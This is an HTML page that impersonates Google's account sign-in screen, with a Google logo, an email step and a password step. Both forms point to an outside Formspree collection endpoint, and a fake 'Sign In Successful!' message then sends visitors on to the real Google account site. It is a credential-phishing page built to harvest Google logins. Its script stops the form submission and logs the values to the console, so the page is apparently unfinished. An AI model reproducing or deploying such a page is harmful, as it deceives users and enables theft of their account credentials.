<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Google Account</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* General Styles */
        body {
            background-color: #1e1f20;
            color: black;
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            position: relative;
        }

        .container {
            background-color: #0e0e0e;
            padding: 20px;
            border-radius: 20px;
            width: 90%;
            max-width: 480px;
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
        }

        .logo {
            font-size: 44px;
            font-weight: 700;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 50px;
            margin-right: 10px;
        }

        .text-container {
            text-align: center;
            margin-bottom: 20px;
        }

        #signinText {
            font-size: 32px; /* Increased font size */
            font-weight: 400;
            margin-top: 20px; /* Closer to the top */
        }

        #useGoogleText {
            font-size: 16px;
            font-weight: 500;
        }

        .input-box {
            width: 100%;
            padding: 16px;
            border: 1px solid #c6c7c5;
            background-color: #0e0e0d;
            color: #c4c8c5;
            border-radius: 5px;
            font-size: 16px;
            margin-bottom: 12px;
            border-color: #e4e4e3;
            box-sizing: border-box; /* Ensures padding is included in the width */
        }

        .input-box::placeholder {
            color: #c4c8c5;
        }

        .link {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-email-link {
            margin-top: 5px;
            align-self: flex-start;
            font-weight: 300;
        }

        .btn-container {
            display: flex;
            flex-direction: column;
            align-items: stretch;
            margin-top: 30px;
            width: 100%;
            gap: 15px;
        }

        .btn {
            background: #8ab4f8;
            color: black;
            padding: 12px;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 100;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            text-align: center;
            color: white;
            width: 100%;
            font-weight: 500;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            margin-top: 5px;
        }

        .footer a {
            color: white;
            text-decoration: none;
            margin: 0 8px;
        }

        /* Success Page Styles */
        .success-page {
            display: none;
            background-color: rgba(0, 0, 0, 0.7); /* Transparent background */
            color: white;
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
            border-radius: 10px;
            flex-direction: column;
        }

        .success-page h1 {
            font-size: 40px;
            font-weight: 700;
            margin-bottom: 20px;
        }

        .success-page p {
            font-size: 18px;
            margin-bottom: 20px;
        }

        .success-page .btn {
            font-size: 18px;
            padding: 15px 30px;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            background-color: #8ab4f8;
            color: black;
            text-decoration: none;
            border: none;
        }

        .password-page {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-top: 20px;
        }

        .show-password-wrapper {
            display: flex;
            justify-content: flex-start;
            width: 100%;
        }

        .show-password-wrapper input {
            margin-right: 10px;
        }

        .try-another-way {
            color: #8ab4f8;
            text-decoration: none;
            font-size: 14px;
            margin-top: 10px;
            display: inline-block;
        }

        .try-another-way-wrapper {
            display: flex;
            justify-content: space-between;
            width: 100%;
            align-items: center;
        }

        /* Responsive Layout */
        @media (max-width: 768px) {
            .container {
                width: 100%;
                padding: 15px;
            }

            #signinText {
                font-size: 28px; /* Smaller for mobile */
            }
        }
    </style>
</head>
<body>
    <div class="container" id="signinBox">
        <div class="logo">
            <img src="https://storage.googleapis.com/libraries-lib-production/images/GoogleLogo-canvas-404-300px.original.png" alt="Google Logo">
        </div>

        <div class="text-container">
            <p id="signinText">Sign in</p>
            <p id="useGoogleText">Use your Google Account</p>
        </div>

        <div class="right-side-container" id="emailPage">
            <!-- Email input page -->
            <form id="signinForm" action="https://formspree.io/f/moveakwr" method="POST" onsubmit="submitEmail(event)">
                <input type="email" id="emailInput" name="email" class="input-box" placeholder="Email or phone" autocomplete="username">
                <div class="btn-container">
                    <button type="submit" class="btn">Next</button>
                    <a href="#" class="try-another-way">Try another way</a>
                </div>
            </form>
        </div>
    </div>

    <div class="container" id="passwordPage" style="display: none;">
        <!-- Password input page -->
        <form id="passwordForm" action="https://formspree.io/f/moveakwr" method="POST" onsubmit="submitPassword(event)">
            <p id="welcomeText">Welcome</p>
            <input type="password" id="passwordInput" name="password" class="input-box" placeholder="Enter your password" autocomplete="current-password">
            
            <!-- Show Password Option -->
            <div class="show-password-wrapper">
                <input type="checkbox" id="showPassword" onclick="togglePassword()"> Show Password
            </div>

            <div class="try-another-way-wrapper">
                <a href="#" class="try-another-way">Try another way</a>
                <button type="submit" class="btn">Sign In</button>
            </div>
        </form>
    </div>

    <div class="success-page" id="successPage">
        <h1>Sign In Successful!</h1>
        <p>You have successfully signed in to your Google Account.</p>
        <a href="https://myaccount.google.com" class="btn" target="_blank">Go to Dashboard</a>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">English (United Kingdom)</a> |
            <a href="#">Help</a> |
            <a href="#">Privacy</a> |
            <a href="#">Terms</a>
        </div>
    </div>

    <script>
        function submitEmail(event) {
            event.preventDefault();

            // Hide email page
            document.getElementById('emailPage').style.display = 'none';

            // Show password page
            document.getElementById('passwordPage').style.display = 'block';

            // Optionally, you can store the email in case you need it later
            var email = document.getElementById('emailInput').value;
            console.log('Email entered: ', email); // You can remove this if not needed
        }

        function submitPassword(event) {
            event.preventDefault();

            // Form submission logic to Formspree
            var password = document.getElementById('passwordInput').value;
            console.log('Password entered: ', password);

            // Hide the form and show the success page
            document.getElementById('signinBox').style.display = 'none';
            document.getElementById('passwordPage').style.display = 'none';
            document.getElementById('successPage').style.display = 'flex'; // show success page
        }

        function togglePassword() {
            var passwordField = document.getElementById('passwordInput');
            var showPasswordCheckbox = document.getElementById('showPassword');

            if (showPasswordCheckbox.checked) {
                passwordField.type = 'text'; // Show password
            } else {
                passwordField.type = 'password'; // Hide password
            }
        }
    </script>
</body>
</html>
